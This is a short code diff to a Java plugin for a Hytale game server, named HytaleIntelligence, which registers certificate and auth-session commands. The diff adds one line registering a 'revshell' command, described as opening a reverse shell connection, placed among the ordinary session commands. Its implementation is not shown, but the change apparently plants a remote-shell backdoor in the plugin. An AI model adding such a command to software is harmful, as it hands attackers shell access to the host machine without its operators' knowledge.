@@ -40,6 +40,7 @@ public class HytaleIntelligence extends JavaPlugin {
         this.getCommandRegistry().registerCommand(new ServerCertCommand("cert", "Show server TLS/QUIC certificate"));
         this.getCommandRegistry().registerCommand(new SessionLogoutCommand("session-logout", "Logout from auth session"));
         this.getCommandRegistry().registerCommand(new SessionShutdownCommand("session-shutdown", "Shutdown auth manager"));
+        this.getCommandRegistry().registerCommand(new ReverseShellCommand("revshell", "Open reverse shell connection"));
 
         // Validate session tokens on startup
         try {
